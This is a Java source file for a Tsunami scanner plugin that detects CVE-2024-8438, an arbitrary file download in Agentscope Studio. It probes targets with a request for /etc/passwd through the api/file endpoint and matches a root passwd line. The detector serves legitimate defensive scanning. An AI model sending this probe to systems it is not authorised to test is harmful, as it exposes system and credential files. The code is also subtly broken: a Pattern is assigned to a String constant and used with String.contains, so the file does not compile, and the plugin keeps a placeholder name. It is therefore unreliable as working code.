/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cve.cve20248438;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.net.MediaType;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-8438 . */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ExampleVulnDetector",
    version = "0.1",
    description = Cve20248438Detector.VULN_DESCRIPTION,
    author = "rdj (rdj@crackatoa.id)",
    bootstrapModule = Cve20248438DetectorBootstrapModule.class)

public final class Cve20248438Detector implements VulnDetector {

  @VisibleForTesting
  static final String DETECTION_STRING = Pattern.compile("(root:[x*]:0:0:)");

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "Agentscope studio version 0.1.1 and prior is vulnerable to Arbitrary File Download via api/file";


  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  
  private final HttpClient httpClient;
  
  private static final String VUL_PATH = "/api/file?";
  
  private static final String GET_DATA = "path=/etc/passwd";
  
  @Inject
  Cve20248438Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }


  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2024-8438 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetVulnerabilityUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VUL_PATH + GET_DATA;
    try {
      HttpResponse httpResponse =
          httpClient.sendAsIs(
              get(targetVulnerabilityUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, MediaType.FORM_DATA.toString())
                          .build())
                  .build());
      if (httpResponse.status().code() == 200
          && httpResponse.bodyString().get().contains(DETECTION_STRING)) {
        return true;
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2024_8438"))
                .setSeverity(Severity.HIGH)
                .setTitle("CVE-2024-8438 Agentscope Studio API Arbitrary File Download")
                .setDescription(VULN_DESCRIPTION)
                .setRecommendation("Ensure this service is not exposed to the public internet. Restrict access using firewall rules, VPN, or an allowlist to limit exposure to only trusted users and networks."))
        .build();
  }
}
